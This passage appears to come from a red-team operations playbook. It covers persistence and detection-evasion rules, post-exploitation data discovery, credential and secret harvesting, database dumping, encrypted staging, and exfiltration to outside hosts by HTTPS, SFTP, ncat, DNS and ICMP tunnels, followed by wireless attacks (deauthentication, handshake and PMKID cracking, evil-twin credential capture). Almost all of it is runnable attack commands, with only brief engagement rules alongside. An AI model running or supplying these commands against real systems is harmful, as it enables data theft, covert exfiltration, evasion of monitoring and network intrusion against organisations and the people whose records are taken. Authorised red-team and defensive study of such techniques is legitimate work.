> 1. **Zero uncataloged persistence** — every persistence hook (service, registry key, cron job, scheduled task, WMI subscription) MUST be logged in the centralized engagement registry with exact path, permissions, timestamp, and hash.
> 2. **Mandatory cleanup script generation** — for every persistence mechanism deployed, a corresponding idempotent rollback script must be authored and verified before the persistence mechanism is activated.
> 3. **Living-off-the-land priority** — favor native system facilities (systemd timers, Windows Task Scheduler) over deploying standalone foreign binaries. Blend executable names, paths, and descriptions with standard OS components.
> 4. **Low-frequency beaconing** — set C2 beacon intervals with substantial jitter (minimum 25–40%) to eliminate periodic network signature spikes detectable by NetFlow analysis and NDR systems.
> 5. **Safe log handling** — never delete entire event logs indiscriminately (`wevtutil cl` generates Event ID 1102, which is heavily monitored). Prefer surgical entry elimination or operating memory-only to prevent disk logging.
> 6. **Integrity baseline respect** — avoid modifying files monitored by active Host File Integrity Monitoring (FIM / AIDE / Tripwire). Verify monitoring rules prior to altering existing system binaries or libraries.
> 7. **Cloud credential expiration** — all backdoor IAM keys, role assignments, or service principals created for persistence must be configured with an explicit automated expiry date and deleted upon exercise completion.

---

## 09. ACTIONS ON OBJECTIVES

**Minimum capability count: 16**

### 1. OBJECTIVE DISCOVERY
**Inputs:** `mission_objective_file`, `target_filesystem`, `crown_jewel_identifiers`, `scope_boundary`, `output_file`
**Tools:** ripgrep, fd, find, locate, grep

```bash
# ripgrep — blazing fast recursive search for mission-critical keywords
rg -i "confidential|restricted|internal only|proprietary" /opt/ /var/www/ -l > objective_files.txt
rg -t md -t txt -t docx -i "financial forecast|q4 earnings" /home/ /data/
rg --hidden -g "!.git" -i "master_secret|production_key" /srv/

# fd — ultra-fast file system discovery targeting objective extensions
fd -e pdf -e xlsx -e docx -e pptx --min-size 10k --search-path /srv/data/ -x echo {} >> targets.txt
fd -H -I -t f "backup.*\.sql" /var/backups/
fd -u -t f ".*\.kdbx" /home/

# find — targeted POSIX search for crown jewels by size, timestamp and permissions
find / -name "*secret*" -o -name "*patent*" -o -name "*budget*" 2>/dev/null > sensitive_paths.txt
find /data -type f -mtime -30 -name "*.xlsx" 2>/dev/null
find /opt -perm -o=r -type f -name "*.conf" 2>/dev/null

# locate — quick index-based identification of files matching objectives
locate -i "customer_list"
locate -i "employee_salaries"

# grep — targeted pattern discovery across mount points
grep -ri "api[_-]key\|private[_-]token" /etc/ /opt/ --exclude-dir=proc 2>/dev/null
```

---

### 2. DATA & FILE DISCOVERY
**Inputs:** `search_path`, `file_extensions`, `exclusion_list`, `size_limits`, `output_list`
**Tools:** ripgrep, jq, tree, du, stat

```bash
# ripgrep — find specific data formats like JSON, XML, or SQL dumps
rg --files /srv/storage/ -g '*.{json,xml,csv,sql,parquet}' > structured_data_files.txt
rg --files /home/ --hidden -g '!node_modules'

# jq — inspect schema and contents of discovered JSON databases
jq 'keys' /opt/app/config/settings.json
jq '.users[] | {username, email, role}' /var/data/users.json | head -n 30
jq '.[0] | keys' /data/exports/customers.json

# tree — generate structural map of high-value objective directories
tree -L 3 -d /srv/enterprise_share/ > directory_structure.txt
tree -L 2 -f -h -P "*.xlsx|*.csv|*.sql" /data/backups/

# du — identify high-density storage directories containing bulk targets
du -ah --max-depth=2 /data/ 2>/dev/null | sort -rh | head -n 25
du -sh /var/lib/mysql /var/lib/postgresql /data/storage

# stat — audit file creation and modification timestamps on critical targets
stat /data/financials/2026_q2_audit.xlsx
stat --format="%n: %y (Owner: %U)" /etc/shadow
```

---

### 3. DATA STAGING & DIRECTORY COLLECTION
**Inputs:** `source_paths`, `staging_directory`, `max_bandwidth`, `archive_type`, `cleanup_policy`
**Tools:** rsync, tar, zip, 7z, cpio

```bash
# rsync — stealthy bandwidth-throttled directory staging
rsync -avz --bwlimit=1000 --include='*.xlsx' --include='*.pdf' --exclude='*' /data/financials/ /tmp/.stage/
rsync -a --no-owner --no-group /opt/proprietary_code/ /tmp/.code_stage/

# tar — consolidate targets into single stream with compression
tar -czf /tmp/.stage/contracts.tar.gz -C /data/ legal/
tar -cf - /var/log/audit/ | gzip -9 > /tmp/.stage/audit_logs.tar.gz
tar --exclude='*.iso' -cvf /tmp/.stage/archive.tar /srv/export/

# zip — standard zip compression with maximum ratio
zip -r -9 /tmp/.stage/customer_data.zip /data/customers/ -x "*.tmp"
zip -j /tmp/.stage/configs.zip /etc/nginx/nginx.conf /etc/mysql/my.cnf

# 7z — high-compression ratio staging
7z a -t7z -mx=9 /tmp/.stage/intel.7z /data/intel/
7z a -tzip -mx=5 /tmp/.stage/docs.zip /home/user/Documents/

# cpio — copy directory tree preserving metadata
find /opt/secure/ -depth | cpio -ov -H newc > /tmp/.stage/secure_tree.cpio
```

---

### 4. SENSITIVE CREDENTIAL & SECRET HARVESTING
**Inputs:** `target_directory`, `entropy_threshold`, `signature_rules`, `git_depth`, `output_json`
**Tools:** trufflehog, gitleaks, rip-secrets, yara, awk

```bash
# trufflehog — discover active credentials across staged data files
trufflehog filesystem /tmp/.stage/ --json > staged_secrets.json
trufflehog git file:///var/git/target.git --entropy=true --max-depth=50

# gitleaks — detect embedded API keys and tokens in source repositories
gitleaks detect --source /opt/webapp --report-path /tmp/leaks.json -v
gitleaks protect --staged --verbose

# rip-secrets — high-speed secret scanner across massive code trees
rip-secrets /srv/development/ > /tmp/exposed_keys.txt
rip-secrets --strict /tmp/.stage/

# yara — scan staging directory with custom secret-hunting YARA rules
yara -r /opt/rules/secrets.yar /tmp/.stage/ > yara_matches.txt
yara -s /opt/rules/private_keys.yar /home/

# awk — extract credential patterns from key-value configuration dumps
awk -F'=' '/password|token|secret|key/ {print $1, "==>", $2}' /srv/app/.env
awk -F':' '{if ($2 != "x" && $2 != "*") print $1, $2}' /etc/shadow
```

---

### 5. DATABASE DUMPING & EXTRACTION
**Inputs:** `db_host`, `db_port`, `db_user`, `db_password`, `target_database`, `output_sql`
**Tools:** mysqldump, pg_dump, sqlite3, impacket-mssqlclient, mongodump

```bash
# mysqldump — export MySQL/MariaDB database schemas and tables
mysqldump -h 10.10.10.20 -u root -p'Password' --databases production_db > prod_dump.sql
mysqldump -h 10.10.10.20 -u admin -p'Password' production_db users orders --single-transaction > users_orders.sql
mysqldump -u root -p'Password' --all-databases --quick --compact > all_dbs_compact.sql

# pg_dump — full PostgreSQL database export
pg_dump -h 10.10.10.20 -U postgres -d enterprise_db -F c -b -v -f /tmp/enterprise.dump
pg_dump -h 10.10.10.20 -U postgres -d enterprise_db -t customers -t transactions -f /tmp/critical_tables.sql

# sqlite3 — dump local embedded SQLite database
sqlite3 /var/lib/app/data.db ".dump" > /tmp/data_dump.sql
sqlite3 /var/lib/app/data.db "SELECT * FROM api_tokens;" > /tmp/api_tokens.csv

# impacket-mssqlclient — dump tables from remote Microsoft SQL Server
impacket-mssqlclient sa:'Password'@10.10.10.20 -windows-auth -q "SELECT * INTO OUTFILE 'C:\\temp\\creds.csv' FROM credentials"
impacket-mssqlclient sa:'Password'@10.10.10.20 -q "SELECT name, database_id, create_date FROM sys.databases;"

# mongodump — extract MongoDB collections
mongodump --host 10.10.10.20 --port 27017 --db customer_db --out /tmp/mongo_stage/
mongodump --uri="mongodb://admin:pass@10.10.10.20:27017/analytics" --collection=users --gzip --archive=/tmp/users.archive
```

---

### 6. ARCHIVE PREPARATION & ENCRYPTION
**Inputs:** `staged_data_path`, `passphrase`, `cipher_algorithm`, `split_size`, `output_archive`
**Tools:** 7z, openssl, gpg, zip, split

```bash
# 7z — create AES-256 encrypted archive with obfuscated header filenames (-mhe=on)
7z a -t7z -p"SuperSecretEngagementPass2026!" -mhe=on /tmp/exfil_payload.7z /tmp/.stage/*
7z a -t7z -p"Pass123!" -mhe=on -v50m /tmp/split_exfil.7z /tmp/.stage/large_database.sql

# openssl — encrypt staging archive with AES-256-CBC and PBKDF2 key derivation
openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -in data.tar.gz -out data.tar.gz.enc -pass pass:"StrongP@ss2026"
openssl enc -d -aes-256-cbc -pbkdf2 -in data.tar.gz.enc -out decrypted.tar.gz -pass pass:"StrongP@ss2026"

# gpg — asymmetric and symmetric file encryption via CLI
gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "TargetPassPhrase" -o secured_evidence.gpg /tmp/.stage/evidence.tar
gpg --batch --yes --encrypt --recipient operator@redteam.local -o asymmetric_exfil.gpg /tmp/.stage/intel.tar

# zip — password protected zip archive
zip -r -e -P "ZipPassword2026!" /tmp/archive_locked.zip /tmp/.stage/
zipcloak /tmp/unencrypted.zip

# split — slice massive encrypted archive into harmless small chunks for exfiltration
split -b 20M /tmp/exfil_payload.7z /tmp/chunk_
cat /tmp/chunk_* > /tmp/reconstructed.7z
```

---

### 7. TRANSFER INTEGRITY & CHECKSUM VALIDATION
**Inputs:** `file_list`, `checksum_algorithm`, `manifest_file`, `verification_target`
**Tools:** sha256sum, md5sum, b2sum, cksum, sha1sum

```bash
# sha256sum — compute and verify cryptographic SHA-256 hashes of objective artifacts
sha256sum /tmp/exfil_payload.7z > /tmp/exfil_payload.7z.sha256
sha256sum -c /tmp/exfil_payload.7z.sha256
find /tmp/.stage/ -type f -exec sha256sum {} + > staging_manifest.sha256
sha256sum --quiet -c staging_manifest.sha256

# b2sum — ultra-fast BLAKE2b checksum calculation
b2sum /tmp/exfil_payload.7z > blake2.checksum
b2sum -c blake2.checksum

# md5sum — legacy cross-validation against historic target baselines
md5sum /tmp/.stage/*.sql > md5_manifest.txt
md5sum -c md5_manifest.txt 2>/dev/null | grep FAILED

# cksum — POSIX standard checksum calculation
cksum /tmp/exfil_payload.7z

# sha1sum — calculate SHA-1 hash
sha1sum /tmp/exfil_payload.7z
```

---

### 8. EXFILTRATION PATH & EGRESS ANALYSIS
**Inputs:** `egress_target_host`, `egress_ports`, `proxy_settings`, `bandwidth_limit`, `payload_file`
**Tools:** curl, rsync, sftp, ncat, openssl

```bash
# curl — exfiltrate encrypted payload via HTTPS POST
curl -k -F "file=@/tmp/exfil_payload.7z" -H "X-Auth: SecretKey123" https://exfil.redteam.com/upload
curl -s -X POST --data-binary "@/tmp/chunk_aa" https://api.dropzone.net/v1/sink
curl --socks5 127.0.0.1:1080 -T /tmp/exfil_payload.7z ftp://anonymous:test@ftp.exfil.org/

# rsync over SSH — bandwidth-throttled secure transfer
rsync -avz -e "ssh -p 2222 -i /tmp/exfil_key" --bwlimit=500 /tmp/exfil_payload.7z exfil_user@drop.redteam.com:/data/
rsync -avz --partial --progress /tmp/.stage/ exfil_user@drop.redteam.com:/staging/

# sftp — non-interactive batch SFTP exfiltration
sftp -b - -P 22 -i /tmp/key user@drop.redteam.com << 'EOF'
cd /incoming/
put /tmp/exfil_payload.7z
bye
EOF

# ncat — raw encrypted TLS egress pipe
ncat --ssl drop.redteam.com 443 < /tmp/exfil_payload.7z
ncat -w 10 drop.redteam.com 8080 < /tmp/chunk_aa

# openssl s_client — direct raw exfiltration over genuine TLS stream
openssl s_client -connect drop.redteam.com:443 -quiet < /tmp/exfil_payload.7z
```

---

### 9. DNS & ICMP COVERT EXFILTRATION
**Inputs:** `authoritative_ns`, `payload_chunk_size`, `target_domain`, `inter_delay`, `icmp_target`
**Tools:** dnscat2, iodined, scapy, ping, dig

```bash
# dnscat2 — encrypted covert exfiltration over recursive DNS lookups
dnscat --dns domain=exfil.targetlab.com,server=10.10.10.10 --secret=exfilpass
# Within dnscat shell: upload /tmp/exfil_payload.7z /tmp/dest.7z

# iodined — high-throughput IPv4 tunnel through DNS
iodine -f -P tunnelpass 10.10.10.10 tunnel.targetlab.com
scp -P 22 /tmp/exfil_payload.7z user@10.0.0.1:/tmp/

# ping — covert exfiltration via ICMP echo request data payload
xxd -p -c 16 /tmp/exfil_payload.7z | while read chunk; do ping -c 1 -p $chunk 192.168.1.100; sleep 0.1; done

# dig — exfiltrate base32 chunks via DNS subdomain queries
python3 -c "
import base64, subprocess, time
data = open('/tmp/exfil_payload.7z', 'rb').read()
b32 = base64.b32encode(data).decode().lower()
chunks = [b32[i:i+50] for i in range(0, len(b32), 50)]
for idx, c in enumerate(chunks):
    domain = f'{idx}.{c}.exfil.targetlab.com'
    subprocess.run(['dig', '+short', domain, '@10.10.10.10'])
    time.sleep(0.05)
"

# scapy — craft bespoke covert protocol headers for stealth egress
python3 -c "
from scapy.all import IP, ICMP, send
data = b'EXFILTRATED_FLAG_CONTENT'
pkt = IP(dst='192.168.1.100')/ICMP(type=8)/data
send(pkt, verbose=0)
"
```

---

### 10. FORENSIC EVIDENCE PRESERVATION
**Inputs:** `evidence_directory`, `terminal_transcript_path`, `disk_device`, `sha_digest`, `operator_id`
**Tools:** script, dd, dc3dd, tar, sha256sum

```bash
# script — record terminal session keystrokes and visual output
script -a -t 2> evidence_timing.log evidence_session.typescript
script -c "whoami && ip a && cat /etc/shadow | head -n 3" proof_execution.log

# dc3dd — forensically sound disk extraction with on-the-fly hashing
dc3dd if=/dev/sda1 of=/tmp/evidence_partition.img hash=sha256 log=/tmp/dc3dd_evidence.log
dc3dd if=/dev/sdb of=/tmp/evidence_usb.dd hash=sha256

# dd — raw byte extraction of target partition or memory segment
dd if=/dev/mem of=/tmp/mem_dump.raw bs=1M count=100 status=progress
dd if=/dev/sda of=/tmp/mbr_backup.bin bs=512 count=1

# tar with ACLs and SELinux/xattrs — preserve filesystem metadata
tar --xattrs --acls --selinux -cvzf /tmp/forensic_stage.tar.gz /opt/target_evidence/

# sha256sum — compute forensic master manifest
sha256sum evidence_session.typescript evidence_timing.log /tmp/forensic_stage.tar.gz > forensic_master.sha256
```

---

### 11. SENSITIVE REGEX PATTERN MATCHING
**Inputs:** `raw_text_corpus`, `regex_library`, `match_context_lines`, `output_format`
**Tools:** ripgrep, pcregrep, egrep, awk, sed

```bash
# ripgrep — detect credit card numbers (Visa, Mastercard, Amex)
rg --no-filename -o -P "\b(?:\d{4}[ -]?){3}\d{4}\b" /data/ > /tmp/extracted_cc.txt
# ripgrep — detect US Social Security Numbers (SSN)
rg --no-filename -o -P "\b\d{3}-\d{2}-\d{4}\b" /data/ > /tmp/extracted_ssn.txt
# ripgrep — detect AWS Access Keys
rg --no-filename -o -P "AKIA[0-9A-Z]{16}" /data/ /etc/ > /tmp/aws_keys.txt
# ripgrep — detect JSON Web Tokens (JWT)
rg --no-filename -o -P "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}\.[A-Za-z0-9._-]{10,}" /data/

# pcregrep — multi-line regex scanning for private key blocks
pcregrep -M "(?s)-----BEGIN [A-Z ]+ PRIVATE KEY-----.*?-----END [A-Z ]+ PRIVATE KEY-----" /srv/ > /tmp/private_keys.pem
pcregrep -M "(?s)<connectionStrings>.*?</connectionStrings>" /var/www/

# egrep — scan for email addresses
egrep -roh "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}" /tmp/.stage/ | sort -u > harvested_emails.txt

# awk + sed — filter and format regex extraction results
awk '{print $1}' /tmp/extracted_cc.txt | sed 's/[- ]//g' | sort -u > clean_cc.txt
```

---

### 12. LOG & EVENT COLLECTION
**Inputs:** `event_channel`, `systemd_unit`, `log_timeframe`, `retention_dir`, `compression_flag`
**Tools:** journalctl, wevtutil (CLI), auditctl, ausearch, tar

```bash
# journalctl — extract systemd logs for specific service units and boots
journalctl -u sshd.service --since "2026-09-01" --until "2026-09-29" > sshd_engagement.log
journalctl -k -b 0 > current_boot_kernel.log
journalctl _COMM=sudo -o json-pretty > sudo_events.json

# wevtutil — export Windows Security and Sysmon channels to EVTX files via CLI
wevtutil epl Security C:\temp\Security_backup.evtx
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\temp\Sysmon_backup.evtx
wevtutil epl System C:\temp\System_backup.evtx

# ausearch — export raw auditd records matching execution and privilege elevation
ausearch -m execve -ts 09/01/2026 -te 09/29/2026 > audit_execve.log
ausearch -m USER_AUTH,USER_START -i > audit_auth.log

# tar — collect and compress all system log files
tar -czf /tmp/all_var_logs.tar.gz /var/log/
```

---

### 13. CLOUD OBJECT STORAGE HARVESTING
**Inputs:** `bucket_name`, `cloud_credentials`, `storage_prefix`, `sync_directory`, `exclude_regex`
**Tools:** aws (CLI), az (CLI), gcloud (CLI), rclone, s3cmd

```bash
# aws s3 — synchronize and download entire S3 storage buckets
aws s3 sync s3://target-confidential-bucket/ /tmp/s3_data/ --only-show-errors
aws s3 cp s3://target-database-backups/prod_backup.tar.gz /tmp/
aws s3 ls s3://target-corporate-records/ --recursive --human-readable

# azcopy — high-speed parallel blob download from Azure Blob Storage
azcopy copy "https://targetstorage.blob.core.windows.net/financials?sv=2021-06-08&ss=b&srt=sco&sp=rl" "/tmp/azure_data/" --recursive=true
az storage blob download-batch -d /tmp/azure_blobs/ -s corporate-docs --account-name targetstore

# gcloud storage — harvest Google Cloud Storage buckets
gcloud storage cp --recursive gs://target-prod-backups/ /tmp/gcs_data/
gcloud storage ls --long --recursive gs://target-data-lake/

# rclone — universal cloud storage sync supporting 40+ cloud backends
rclone sync s3_remote:secret-bucket /tmp/rclone_data/ --transfers 8 --progress
rclone copy azure_remote:data /tmp/azure_rclone/

# s3cmd — command line S3 client
s3cmd sync s3://target-bucket /tmp/s3cmd_out/
s3cmd get s3://target-bucket/flag.txt /tmp/flag.txt
```

---

### 14. DATA AGGREGATION & IMPACT CORRELATION
**Inputs:** `extracted_data_files`, `correlation_key`, `output_format`, `metric_definitions`
**Tools:** jq, sqlite3, datamash, sort, awk

```bash
# jq — aggregate multiple JSON database dumps and count records by department
jq -s 'add | group_by(.department) | map({dept: .[0].department, count: length})' /tmp/.stage/*.json > dept_summary.json
jq -r '[.id, .name, .ssn, .salary] | @csv' /tmp/.stage/employees.json > employees.csv

# sqlite3 — ingest raw CSV datasets into temporary database to compute financial exposure
sqlite3 /tmp/impact.db << 'EOF'
.mode csv
.import /tmp/.stage/transactions.csv transactions
.import /tmp/.stage/accounts.csv accounts
SELECT accounts.account_type, SUM(transactions.amount), COUNT(*) 
FROM transactions JOIN accounts ON transactions.account_id = accounts.id 
GROUP BY accounts.account_type;
EOF

# datamash — calculate quick statistical summaries across numerical data
cat /tmp/clean_salaries.txt | datamash count 1 sum 1 mean 1 median 1 max 1 > salary_impact.txt

# sort + awk — find top 20 most frequent breached domains
awk -F'@' '{print $2}' /tmp/harvested_emails.txt | sort | uniq -c | sort -nr | head -n 20
```

---

### 15. CRYPTOGRAPHIC CHAIN OF CUSTODY
**Inputs:** `artifact_path`, `custody_log_file`, `operator_gpg_key`, `timestamp_authority`, `sha512_digest`
**Tools:** openssl, gpg, sha512sum, ts (moreutils), git

```bash
# sha512sum — calculate unforgeable SHA-512 cryptographic digests
sha512sum /tmp/exfil_payload.7z >> /tmp/custody_manifest.sha512
sha512sum -c /tmp/custody_manifest.sha512

# openssl dgst — generate detached cryptographic signature
openssl dgst -sha256 -sign operator_private.key -out /tmp/exfil_payload.7z.sig /tmp/exfil_payload.7z
openssl dgst -sha256 -verify operator_public.pem -signature /tmp/exfil_payload.7z.sig /tmp/exfil_payload.7z

# gpg — digitally sign evidence manifest with operator GPG key
gpg --batch --yes --armor --detach-sign -u operator@redteam.local /tmp/custody_manifest.sha512
gpg --verify /tmp/custody_manifest.sha512.asc /tmp/custody_manifest.sha512

# ts — RFC-3339 microsecond timestamping of custody transfers
echo "Evidence transferred to secure offline safe by Operator-01" | ts -u '[%FT%T.%fZ]' >> chain_of_custody.log

# git — commit evidence manifest to cryptographically signed local ledger
git init /tmp/evidence_ledger
cd /tmp/evidence_ledger && git add . && git commit -S -m "Initial evidence seal"
```

---

### 16. OBJECTIVE REPORTING & METRICS
**Inputs:** `objective_checklist`, `metrics_input`, `impact_criteria`, `executive_summary_path`
**Tools:** pandoc, wc, du, python3, enscript

```bash
# python3 — generate automated executive objective achievement metrics
python3 -c "
import json
print('=== RED TEAM OBJECTIVE ACCOMPLISHMENT MATRIX ===')
print('Objective 1 [Domain Admin]: COMPLETED (T=02:14:00)')
print('Objective 2 [Customer PII]: COMPLETED (Records: 1,240,500)')
print('Objective 3 [Financials]:  COMPLETED (Q4 Models Extracted)')
print('Objective 4 [Source Code]:  COMPLETED (Git Repos Cloned: 14)')
" > /tmp/objective_metrics.txt

# wc + du — quantify exfiltrated records and byte volume
wc -l /tmp/extracted_cc.txt /tmp/extracted_ssn.txt /tmp/harvested_emails.txt
du -sh /tmp/exfil_payload.7z /tmp/.stage/

# pandoc — convert Markdown objective ledger into professional HTML/PDF report
pandoc -s /tmp/objective_metrics.txt -o /tmp/executive_objective_report.html --metadata title="Actions on Objectives"

# enscript — format ASCII evidence logs with headers and line numbers
enscript -B -p /tmp/evidence_proof.ps /tmp/objective_metrics.txt
```

---

### Phase Rule — ACTIONS ON OBJECTIVES

> **Operational doctrine.** Actions on objectives represent the ultimate fulfillment of the red team mission. Mishandling live production data creates unacceptable legal liability, confidentiality breaches, and system instability. Execution protocol:
>
> 1. **PII and PCI-DSS data minimization** — do NOT exfiltrate millions of live credit card numbers or patient records. Prove access by capturing directory listings, schema definitions, and a sanitized sample of 3–5 obfuscated records.
> 2. **Client-side encryption before exfiltration** — all collected artifacts and staged databases MUST be encrypted with AES-256 before leaving the target host or pivot boundary. Unencrypted exfiltration over plaintext channels is strictly prohibited.
> 3. **Egress bandwidth rate-limiting** — exfiltration transfers must be throttled (`--bwlimit` on rsync, sleep intervals on curl/DNS) to prevent saturating enterprise network circuits or tripping anomalous bandwidth alerts on edge firewalls.
> 4. **Hash-verified integrity and chain of custody** — compute SHA-256 and SHA-512 hashes of all captured evidence immediately upon generation, and record them in a cryptographically signed chain-of-custody ledger.
> 5. **Read-only impact operations** — never alter, corrupt, encrypt, or delete target production databases or critical intellectual property. Operations on data are strictly read-only and extract-only.
> 6. **Cloud storage egress monitoring** — when extracting from cloud buckets (S3, Azure Blob, GCS), ensure cloud egress costs and API request rates are monitored to prevent budget overruns or CloudWatch / GuardDuty alarms.
> 7. **Surgical staging cleanup** — all staging directories (`/tmp/.stage/`, temporary dumps, unencrypted archives) must be securely wiped using `shred` immediately following verified exfiltration.

---

## 10. WIRELESS HACKING

**Minimum capability count: 16**

### 1. WIRELESS INTERFACE & MONITOR MODE
**Inputs:** `wireless_interface`, `driver_name`, `channel_band`, `rfkill_state`, `output_status`
**Tools:** iw, ip, airmon-ng, rfkill, iwconfig

```bash
# rfkill — unblock wireless interfaces at hardware/software layer
rfkill list
rfkill unblock wifi
rfkill unblock all

# airmon-ng — kill interfering processes and enable monitor mode
airmon-ng check kill
airmon-ng start wlan0
airmon-ng stop wlan0mon

# iw — native Linux modern netlink monitor mode configuration
iw dev
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
iw dev wlan0 info

# iwconfig — legacy wireless interface parameter configuration
iwconfig wlan0 mode monitor
iwconfig wlan0 channel 6
iwconfig wlan0 txpower 30

# ip — verify link flags and MAC address on monitor interface
ip link show wlan0
ip link set dev wlan0 address 00:11:22:33:44:55
```

---

### 2. SPECTRUM & NETWORK RECONNAISSANCE
**Inputs:** `monitor_interface`, `band_selection`, `hop_interval`, `output_prefix`, `gpsd_socket`
**Tools:** airodump-ng, kismet (CLI), nmcli, wavemon (CLI), iwlist

```bash
# airodump-ng — broad spectrum 2.4GHz and 5GHz sweep
airodump-ng --band abg -w /tmp/recon_sweep --output-format csv,pcap wlan0mon
airodump-ng --band a wlan0mon
airodump-ng --manufacturer --uptime wlan0mon

# kismet — headless CLI server daemon for comprehensive RF logging
kismet_server -c wlan0mon -t enterprise_audit --no-interactive
kismet_cap_linux_wifi --source=wlan0mon:type=linuxwifi --tcp-server=127.0.0.1:2501

# nmcli — fast active scan of local wireless networks via NetworkManager CLI
nmcli device wifi list
nmcli device wifi rescan
nmcli -f SSID,BSSID,MODE,CHAN,FREQ,RATE,SIGNAL,BARS,SECURITY device wifi list

# wavemon — CLI wireless monitoring utility
wavemon -i wlan0mon

# iwlist — trigger passive/active scanning of available wireless cells
iwlist wlan0 scan | grep -E "Cell |ESSID|Channel|Encryption"
```

---

### 3. ACCESS POINT TARGET ENUMERATION
**Inputs:** `target_bssid`, `target_channel`, `target_essid`, `monitor_interface`, `output_file`
**Tools:** airodump-ng, wash, hcxdumptool, mdk4, iw

```bash
# airodump-ng — lock onto specific channel and target BSSID
airodump-ng -c 11 --bssid 00:14:6C:7E:40:80 -w /tmp/target_ap --output-format pcap,csv wlan0mon
airodump-ng --essid "TargetCorp_Secure" -c 1,6,11 wlan0mon

# wash — scan for Access Points supporting Wi-Fi Protected Setup (WPS)
wash -i wlan0mon
wash -i wlan0mon -c 6 -s
wash -i wlan0mon --ignore-fcs

# hcxdumptool — probe and enumerate APs with specific beacon request packets
hcxdumptool -i wlan0mon -m 00:14:6C:7E:40:80 --rcascan=active
hcxdumptool -i wlan0mon --bpfilter="wlan addr1 00:14:6C:7E:40:80"

# mdk4 — probe hidden SSIDs and beacon capabilities
mdk4 wlan0mon p -b bssid_list.txt -t 00:14:6C:7E:40:80

# iw — query scan capabilities of specific hardware
iw dev wlan0mon scan dump | grep -B 2 -A 5 "SSID"
```

---

### 4. WPA/WPA2 HANDSHAKE CAPTURE
**Inputs:** `target_bssid`, `target_client_mac`, `channel`, `deauth_count`, `capture_pcap`
**Tools:** airodump-ng, aireplay-ng, hcxdumptool, mdk4, tshark

```bash
# airodump-ng — monitor channel for active 4-way handshake exchange
airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w /tmp/handshake wlan0mon

# aireplay-ng — targeted deauthentication frame injection to force client reconnection
aireplay-ng -0 5 -a 00:14:6C:7E:40:80 -c CC:29:F5:2A:43:11 wlan0mon
aireplay-ng --deauth 10 -a 00:14:6C:7E:40:80 wlan0mon
aireplay-ng -9 wlan0mon

# hcxdumptool — capture 4-way handshake frames directly to pcapng
hcxdumptool -i wlan0mon -o /tmp/capture.pcapng --enable_status=1
hcxdumptool -i wlan0mon -o /tmp/target.pcapng --filtermode=2 --filterlist_ap=target_bssid.txt

# mdk4 — smart deauthentication targeting specific clients
mdk4 wlan0mon d -B 00:14:6C:7E:40:80 -S CC:29:F5:2A:43:11 -c 6

# tshark — verify captured PCAP contains full EAPOL 4-way handshake
tshark -r /tmp/handshake-01.cap -Y "eapol" -T fields -e frame.number -e wlan.sa -e wlan.da
```

---

### 5. PMKID EXTRACTION & HARVESTING
**Inputs:** `target_bssid`, `capture_interface`, `pcapng_output`, `hashcat_mode_22000`, `hash_file`
**Tools:** hcxdumptool, hcxpcapngtool, hcxhashtool, wlanhcx2john, hashcat

```bash
# hcxdumptool — clientless attack to extract RSN PMKID directly from Access Point
hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=15
hcxdumptool -i wlan0mon -o /tmp/pmkid_target.pcapng --filtermode=2 --filterlist_ap=ap.txt

# hcxpcapngtool — convert captured pcapng file into Hashcat 22000 format
hcxpcapngtool -o /tmp/hashes.22000 -E essid_list.txt /tmp/pmkid.pcapng
hcxpcapngtool -o /tmp/hashes.22000 --all /tmp/capture.pcapng

# hcxhashtool — filter, inspect and sanitize extracted 22000 hashes
hcxhashtool -i /tmp/hashes.22000 --info
hcxhashtool -i /tmp/hashes.22000 -o /tmp/clean.22000 --essid="TargetCorp"
hcxhashtool -i /tmp/hashes.22000 --pmkid -o /tmp/pmkid_only.22000

# wlanhcx2john — convert capture file for John the Ripper
wlanhcx2john /tmp/pmkid.pcapng > /tmp/john_wireless.txt

# hashcat — crack WPA-PBKDF2-PMKID / EAPOL hashes using Mode 22000
hashcat -m 22000 -a 0 /tmp/hashes.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -w 3
```

---

### 6. ENTERPRISE 802.1X ATTACKS
**Inputs:** `target_ssid`, `rogue_interface`, `radius_secret`, `identity_string`, `mschapv2_output`
**Tools:** hostapd-wpe, eaphammer (CLI), asleap, tshark, freeradius-wpe

```bash
# hostapd-wpe — rogue Enterprise AP capturing MSCHAPv2 challenge/response hashes
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# hostapd-wpe.conf configuration:
# interface=wlan0mon
# ssid=Corporate-Enterprise
# wpa=2
# wpa_key_mgmt=WPA-EAP
# wpa_pairwise=CCMP

# eaphammer — sophisticated WPA-Enterprise evil twin and credential harvesting CLI
eaphammer -i wlan0 --channel 6 --essid "Corporate-Enterprise" --creds --auth wpa2-enterprise
eaphammer -i wlan0 --channel 11 --essid "Corporate-Enterprise" --wpa2-enterprise --hostapd-wpe
eaphammer -i wlan0 --pmkid --essid "Corporate-Enterprise"

# asleap — crack captured MSCHAPv2 challenge/response pairs
asleap -C 11:22:33:44:55:66:77:88 -R aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff -W /usr/share/wordlists/rockyou.txt
asleap -r /tmp/eapol.pcap -W /usr/share/wordlists/rockyou.txt

# tshark — extract MSCHAPv2 username and challenge tokens from capture
tshark -r /tmp/enterprise.pcap -Y "eap.type == 26" -T fields -e eap.identity -e eapol.keydes.data
```

---

### 7. CLIENT ENUMERATION & PROBE SNOOPING
**Inputs:** `monitor_interface`, `capture_duration`, `probe_regex`, `output_db`, `signal_floor`
**Tools:** airodump-ng, tshark, tcpdump, kismet (CLI), mdk4

```bash
# airodump-ng — capture client probe requests across all channels
airodump-ng --band abg -w /tmp/probe_recon --output-format csv wlan0mon

# tshark — real-time extraction of unassociated client probe requests
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0004" -T fields -e wlan.sa -e wlan.ssid -E separator=" -> "
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0005" -T fields -e wlan.bssid -e wlan.ssid

# tcpdump — live stream probe requests filtered by BPF
tcpdump -i wlan0mon -e -s 0 type mgt subtype probe-req
